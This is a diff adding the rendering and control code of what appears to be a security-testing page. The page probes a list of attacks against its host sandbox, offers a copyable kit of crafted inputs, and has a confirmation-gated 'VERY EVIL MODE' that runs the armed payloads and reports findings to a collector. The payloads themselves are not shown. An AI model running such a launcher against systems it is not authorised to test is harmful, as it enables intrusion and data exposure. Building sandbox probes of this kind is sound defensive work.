+  function renderRows() {
+    rowsEl.innerHTML = '';
+    for (const a of ATTACKS) {
+      const r = state.results[a.id] || {};
+      const div = document.createElement('div');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
+      div.dataset.attack = a.id;
+      div.dataset.status = r.status || 'pending';
+      div.innerHTML =
+        '<div class="attack-head">' +
+          statusChip(r.status) +
+          '<span class="attack-name">' + esc(a.name) + '</span>' +
+          sevChip(a.severity) +
+          '<span class="spacer"></span>' +
+          '<div class="row-actions"><button data-probe="' + a.id + '" type="button">probe</button></div>' +
+        '</div>' +
+        '<div class="attack-target">' + esc(a.target) + '</div>' +
+        '<div class="evidence">' + esc(r.evidence || 'not probed') + '</div>';
+      rowsEl.appendChild(div);
+    }
+    rowsEl.querySelectorAll('button[data-probe]').forEach((b) => {
+      b.addEventListener('click', () => runDemo(b.dataset.probe));
+    });
+  }
+  function renderSummary() {
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
+    summaryEl.innerHTML = state.veryEvil
+      ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a';
+    const armable = counts.armed + counts.sent;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — launcher held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
+  }
+  function render() { renderRows(); renderSummary(); }
+
+  async function runDemo(id) {
+    const a = ATTACKS.find((x) => x.id === id);
+    if (!a) return;
+    state.results[id] = { status: 'pending', evidence: 'probing…' };
+    render();
+    try {
+      state.results[id] = await a.demo();
+    } catch (e) {
+      state.results[id] = { status: 'na', evidence: 'probe error: ' + errMsg(e) };
+    }
+    render();
+    updateReport();
+  }
+  async function runAllDemos() {
+    for (const a of ATTACKS) await runDemo(a.id);
+  }
+
+  /* ---------- VERY EVIL ---------- */
+
+  function planOrder() {
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
+  }
+  function openConfirm() {
+    const armable = planOrder().filter((a) => {
+      const s = (state.results[a.id] || {}).status;
+      return s === 'armed' || s === 'sent';
+    });
+    if (!armable.length) return;
+    planList.innerHTML = '';
+    for (const a of armable) {
+      const li = document.createElement('li');
+      li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
+      planList.appendChild(li);
+    }
+    collectorInput.value = state.collector;
+    confirmInput.value = '';
+    confirmBtn.disabled = true;
+    confirmDlg.showModal();
+  }
+  collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
+  confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
+
+  confirmBtn.addEventListener('click', async () => {
+    confirmDlg.close();
+    await executeVeryEvil();
+  });
+
+  async function executeVeryEvil() {
+    state.veryEvil = true;
+    evilPanel.hidden = false;
+    evilLog.textContent = '';
+    const logLine = (s) => {
+      evilLog.textContent += '[' + new Date().toISOString() + '] ' + s + '\n';
+      evilLog.scrollTop = evilLog.scrollHeight;
+    };
+    logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
+    logLine('collector: ' + state.collector);
+    renderSummary();
+    for (const a of planOrder()) {
+      const st = (state.results[a.id] || {}).status;
+      if (st !== 'armed' && st !== 'sent') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — launcher holds' };
+        logLine('SKIP ' + a.name + ' — not armable, the launcher holds');
+        updateReport();
+        continue;
+      }
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
+      try {
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
+      } catch (e) {
+        state.evilResults[a.id] = { error: errMsg(e) };
+        logLine('ERR  ' + a.name + ' → ' + errMsg(e));
+      }
+      updateReport();
+      renderSummary();
+    }
+    logLine('finished. everything above actually happened.');
+    updateReport();
+  }
+
+  /* ---------- report ---------- */
+
+  function buildReport() {
+    return {
+      napp: window.__EVIL_ID__ || 'unknown',
+      mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
+      at: new Date().toISOString(),
+      collector: state.collector,
+      location: safeGet(() => location.href),
+      origin: safeGet(() => window.origin),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      bridge: bridgePresence(),
+      parentLength: safeGet(() => window.parent.length),
+      findings: ATTACKS.map((a) => Object.assign({ id: a.id, name: a.name, severity: a.severity }, state.results[a.id] || {}, { evil: state.evilResults[a.id] || null })),
+    };
+  }
+  function updateReport() {
+    reportText.value = JSON.stringify(buildReport(), null, 2);
+  }
+  document.getElementById('copyReportBtn').addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(reportText.value);
+    } catch (_) {
+      reportText.select();
+    }
+  });
+  document.getElementById('reportBtn').addEventListener('click', () => {
+    const d = document.getElementById('report');
+    d.open = !d.open;
+  });
+
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
+  document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
+
+  /* ---------- boot ---------- */
+  renderKit();
+  render();
+  updateReport();
+  void runAllDemos();
+})();
+</script>
+</body>
+</html>
